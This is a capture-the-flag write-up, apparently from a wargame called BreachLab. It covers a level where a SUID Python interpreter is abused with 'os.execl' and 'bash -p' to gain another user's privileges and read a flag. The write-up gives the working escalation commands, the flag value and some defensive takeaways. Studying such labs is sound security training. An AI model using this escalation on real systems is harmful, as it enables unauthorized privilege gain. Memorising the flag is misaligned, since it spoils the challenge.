# BreachLab - Phantom Track: Level 4 (Misplaced Power)

## General Information

- **Platform:** [BreachLab](https://breachlab.org)
- **Track:** Phantom Track (Post-Exploitation & Operational Tradecraft)
- **Level:** Level 4 (Misplaced Power)
- **Host:** `204.168.229.209`
- **Port:** `2223`
- **Current User:** `phantom4`
- **Compromised User:** `flagkeeper4`
- **Goal:** Enumerate non-standard SUID binaries, exploit an elevated Python 3 interpreter, preserve the effective UID via `bash -p`, and retrieve the level flag
- **Next User / Flag Code:** `bl_phtm4_81dfa6befd385db4`

---

## 1. Scenario & Objectives

Upon logging into the host via SSH, the MOTD banner and `BRIEFING` detail the mission parameters:

```
MISSION: Misplaced Power
========================

Something on this system is a general-purpose interpreter that
should never have been shipped with SUID. It is NOT owned by
root — but it is owned by someone who can read more than you.

Enumerate the SUID binaries on this box. Understand which one
is out of place, and what it lets you do.

FLAG: owned by the same user as the misconfigured SUID binary.
```

The objective is to perform filesystem enumeration for SUID binaries and Linux file capabilities, identify a misconfigured SetUID Python interpreter belonging to `flagkeeper4`, execute an in-memory subshell payload while disabling Bash's automatic privilege drop mechanism (`-p`), and retrieve `/var/lib/phantom-flags/level4_flag`.

---

## 2. Reconnaissance & Privilege Enumeration

Logging in via SSH as `phantom4` and auditing system privileges:

```bash
phantom4@phantom:~$ find / -perm -4000 -type f 2>/dev/null
/opt/maintenance/cleanup.sh
/usr/local/bin/phantom-wipe-l12-wrapper
/usr/local/bin/phantom-wipe-history-wrapper
/usr/local/bin/phantom-verify
/usr/local/bin/leaky-vessels
/usr/local/bin/system-checker
/usr/local/bin/phantom-python3
/usr/local/bin/phantom-find
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/bin/mount
/usr/bin/umount
/usr/bin/newgrp
/usr/bin/su
/usr/bin/sudo
/usr/bin/at

phantom4@phantom:~$ getcap -r / 2>/dev/null
/usr/bin/ping cap_net_raw=ep
```

### Permission & Ownership Breakdown

Inspecting the permissions of the custom binaries in `/usr/local/bin/`:

```bash
phantom4@phantom:~$ ls -l /usr/local/bin/phantom-python3 /usr/local/bin/phantom-find
-rwsr-x--- 1 flagkeeper1 phantom1  282088 May 28 16:07 /usr/local/bin/phantom-find
-rwsr-x--- 1 flagkeeper4 phantom4 5937704 May 28 16:07 /usr/local/bin/phantom-python3
```

- **Binary:** `/usr/local/bin/phantom-python3`
- **Owner:** `flagkeeper4` (the target user owning the level flag)
- **Group:** `phantom4` (our current group, granting execution rights: `r-x`)
- **SUID Bit (`s`):** Active (`-rwsr-x---`). When executed by a member of `phantom4`, the process executes under the effective identity and permissions of `flagkeeper4`.

---

## 3. Vulnerability Mechanism: SUID on General-Purpose Interpreters

Standard SUID binaries (like `/usr/bin/passwd`) are purpose-built utilities designed to perform strict, pre-programmed tasks.

In contrast, general-purpose interpreters and execution runtimes (Python, Perl, Ruby, Node.js, PHP) expose low-level operating system bindings, file descriptor access, and dynamic library loading. Setting the SetUID bit on an interpreter breaks security boundaries completely: any user authorized to run the interpreter can supply arbitrary instructions and execute arbitrary system calls with the owner's privileges (GTFOBins).

---

## 4. Exploitation: In-Memory Python Execution & Privileged Subshell Escape

To avoid generating disk artifacts, we invoke Python with the inline code flag (`-c`):

```bash
phantom4@phantom:~$ cd /tmp
phantom4@phantom:/tmp$ /usr/local/bin/phantom-python3 -c 'import os; os.execl("/bin/bash", "bash", "-p")'
bash-5.1$ whoami
flagkeeper4
```

### Technical Breakdown of the Injection Payload

1. **`import os`**: Loads Python's interface to POSIX operating system primitives.
2. **`os.execl("/bin/bash", "bash", "-p")`**: Performs an `execve` system call, replacing the memory image of the current Python process with `/bin/bash`.

### Critical Role of the `-p` (Privileged Mode) Flag

Linux tracks two distinct user identity descriptors for running processes:
- **Real UID (`rUID`):** The actual account that launched the process (`phantom4`, UID 1004).
- **Effective UID (`eUID`):** The operational identity evaluated by the Linux kernel for access control checks (`flagkeeper4`, UID 1021).

Modern shells like Bash implement an automatic privilege dropping countermeasure: upon startup, if Bash detects that `eUID != rUID`, it automatically resets the `eUID` to match the unprivileged `rUID`, neutralizing the SUID elevation.

Passing the **`-p`** (*privileged mode*) flag explicitly disables this security countermeasure, forcing Bash to preserve the elevated `eUID` inherited from the SetUID binary.

---

## 5. Privilege Consolidation & Flag Extraction

With an interactive shell operating under the security context of `flagkeeper4`, we retrieve the flag:

```bash
bash-5.1$ whoami
flagkeeper4

bash-5.1$ cat /var/lib/phantom-flags/level4_flag
bl_phtm4_81dfa6befd385db4
```

---

## 6. Flag / Credentials Retrieved

| Parameter | Value |
| :--- | :--- |
| **Track** | Phantom Track (Level 4) |
| **Current User** | `phantom4` |
| **Compromised User** | `flagkeeper4` |
| **Vulnerable Binary** | `/usr/local/bin/phantom-python3` (`-rwsr-x---`) |
| **Vulnerability Type** | Misconfigured SUID Bit on General-Purpose Interpreter |
| **Exploitation Technique** | GTFOBins Python `os.execl` with Privileged Mode (`bash -p`) |
| **Discovered Flag** | `bl_phtm4_81dfa6befd385db4` |
| **Artifact Path** | `/var/lib/phantom-flags/level4_flag` |

---

## 7. Key Commands & Concepts Reference

- `find / -perm -4000 -type f 2>/dev/null`: Discover all SetUID binaries across the filesystem.
- `getcap -r / 2>/dev/null`: Audit Linux file capabilities recursively across all mounted filesystems.
- `python3 -c 'import os; os.execl("/bin/bash", "bash", "-p")'`: Execute inline Python instructions to spawn a replacement subshell.
- `bash -p`: Launch Bash in privileged mode to prevent automated effective UID (`eUID`) dropping.

---

## 8. Lessons Learned & Defensive Takeaways

1. **Never Assign SUID to Scripting Interpreters or Compilers:** Assigning SetUID permissions to tools capable of evaluating dynamic code (`python`, `perl`, `node`, `php`, `sh`, `awk`) is functionally equivalent to providing unrestricted, passwordless shell access as the owner.
2. **Kernel Access Evaluation via `eUID`:** File access permissions (DAC) and system call authorization are strictly validated against the process Effective UID (`eUID`), not the Real UID (`rUID`).
3. **SOC Detection & Forensic Telemetry:** Spawning shells with the `-p` parameter (`/bin/bash -p` or `/bin/sh -p`) is an unmistakable Indicator of Compromise (IoC) in endpoint detection and Linux auditd logs, signaling SUID abuse or privilege escalation attempts.
